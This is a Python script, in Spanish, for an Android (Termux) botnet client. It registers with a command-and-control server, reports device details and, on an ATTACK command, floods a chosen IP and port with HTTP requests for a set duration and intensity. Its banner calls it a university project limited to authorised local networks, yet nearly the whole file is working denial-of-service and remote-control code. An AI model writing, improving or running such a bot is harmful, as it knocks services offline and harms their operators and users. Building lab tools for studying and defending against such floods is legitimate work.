#!/data/data/com.termux/files/usr/bin/python3
"""
🤖 BOT MOVIL DDoS - Conecta al servidor maestro
Ejecutar en Termux: python3 bot_movil.py
"""

import socket
import threading
import time
import random
import os
import sys

# ========= CONFIGURACIÓN =========
# CAMBIA ESTO A LA IP DE TU PC
MASTER_IP = "192.168.1.10"  # ← TU IP PRIVADA AQUÍ
MASTER_PORT = 9999
BOT_ID = f"MOVIL_{random.randint(1000, 9999)}"

# ========= FUNCIONES =========
def log(msg):
    timestamp = time.strftime("%H:%M:%S")
    print(f"[{timestamp}] [{BOT_ID}] {msg}")

def get_device_info():
    """Obtiene info del dispositivo Android"""
    try:
        # Obtener IP local
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 53))
        local_ip = s.getsockname()[0]
        s.close()
        
        # Info de Android (si está disponible)
        android_version = "Desconocido"
        try:
            android_version = os.popen("getprop ro.build.version.release").read().strip() or "Desconocido"
        except:
            pass
            
        return f"IP:{local_ip}|Android:{android_version}"
    except:
        return "IP:Desconocida|Android:Desconocido"

def connect_to_master():
    """Conecta y mantiene conexión con el maestro"""
    log(f"Iniciando conexión a {MASTER_IP}:{MASTER_PORT}")
    
    while True:
        try:
            # Crear socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            
            # Conectar
            sock.connect((MASTER_IP, MASTER_PORT))
            
            # Enviar identificación
            device_info = get_device_info()
            sock.send(f"HELLO|{BOT_ID}|{device_info}\n".encode())
            
            log("✅ Conectado al servidor maestro")
            
            # Escuchar comandos
            while True:
                try:
                    data = sock.recv(1024).decode().strip()
                    if not data:
                        log("Conexión cerrada por el servidor")
                        break
                    
                    log(f"Comando recibido: {data}")
                    
                    # Procesar comando
                    if data == "PONG":
                        pass
                    elif data.startswith("ATTACK|"):
                        # Formato: ATTACK|IP|PUERTO|DURACION|INTENSIDAD
                        parts = data.split("|")
                        if len(parts) >= 5:
                            target_ip = parts[1]
                            target_port = int(parts[2])
                            duration = int(parts[3])
                            intensity = int(parts[4])
                            
                            log(f"🔥 Ejecutando ataque: {target_ip}:{target_port}")
                            
                            # Iniciar ataque en hilo separado
                            attack_thread = threading.Thread(
                                target=execute_attack,
                                args=(target_ip, target_port, duration, intensity, sock),
                                daemon=True
                            )
                            attack_thread.start()
                    
                    # Enviar ping periódico
                    sock.send("PING\n".encode())
                    
                except socket.timeout:
                    # Timeout normal, enviar ping
                    sock.send("PING\n".encode())
                    continue
                except Exception as e:
                    log(f"Error en comunicación: {e}")
                    break
            
            sock.close()
            log("Desconectado. Reintentando en 5 segundos...")
            
        except ConnectionRefusedError:
            log("❌ No se puede conectar al maestro. ¿Está ejecutándose?")
        except Exception as e:
            log(f"Error de conexión: {e}")
        
        # Esperar antes de reconectar
        time.sleep(5)

def execute_attack(target_ip, target_port, duration, intensity, master_sock):
    """Ejecuta ataque HTTP flood"""
    log(f"🎯 ATAQUE INICIADO: {target_ip}:{target_port} por {duration}s")
    
    end_time = time.time() + duration
    request_count = 0
    
    # Headers HTTP variados
    user_agents = [
        "Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36",
        "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
        "Termux-DDoS-Bot/1.0 (Proyecto Universitario)"
    ]
    
    try:
        while time.time() < end_time and request_count < (duration * intensity * 2):
            try:
                # Crear socket
                attack_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                attack_sock.settimeout(2)
                
                # Conectar al objetivo
                attack_sock.connect((target_ip, target_port))
                
                # Enviar múltiples requests por conexión
                for _ in range(max(1, intensity // 2)):
                    if time.time() > end_time:
                        break
                    
                    # Construir request HTTP
                    user_agent = random.choice(user_agents)
                    http_request = (
                        f"GET / HTTP/1.1\r\n"
                        f"Host: {target_ip}\r\n"
                        f"User-Agent: {user_agent}\r\n"
                        f"Accept: text/html,application/xhtml+xml\r\n"
                        f"Connection: keep-alive\r\n\r\n"
                    )
                    
                    attack_sock.send(http_request.encode())
                    request_count += 1
                    
                    # Pequeña pausa entre requests
                    time.sleep(max(0.01, 1.0 / intensity))
                
                attack_sock.close()
                
                # Reportar cada 10 requests
                if request_count % 10 == 0:
                    master_sock.send(f"REPORT|Requests: {request_count}\n".encode())
                    
            except socket.error as e:
                # Error de conexión - probablemente servidor saturado
                log(f"⚠️  Error de socket: {e}")
                time.sleep(0.5)
            except Exception as e:
                log(f"❌ Error en ataque: {e}")
                break
        
        # Reporte final
        log(f"✅ ATAQUE COMPLETADO: {request_count} requests enviados")
        master_sock.send(f"REPORT|Ataque finalizado: {request_count} requests\n".encode())
        
    except Exception as e:
        log(f"❌ Error crítico en ataque: {e}")

def show_banner():
    """Muestra banner informativo"""
    print("\n" + "="*50)
    print("    🤖 BOT MOVIL DDoS - PROYECTO UNIVERSITARIO")
    print("="*50)
    print(f"ID: {BOT_ID}")
    print(f"Maestro: {MASTER_IP}:{MASTER_PORT}")
    print(f"Info: {get_device_info()}")
    print("="*50)
    print("⚠️  SOLO USO EDUCATIVO EN RED LOCAL AUTORIZADA")
    print("="*50 + "\n")

def main():
    """Función principal"""
    show_banner()
    
    # Iniciar conexión
    try:
        connect_to_master()
    except KeyboardInterrupt:
        log("Bot detenido por usuario")
    except Exception as e:
        log(f"Error fatal: {e}")
    
    print("\n👋 Bot finalizado")

if __name__ == "__main__":
    # Instalar requests si es necesario
    try:
        import requests
    except:
        print("Instalando requests...")
        os.system("pip install requests > /dev/null 2>&1")
    
    main()
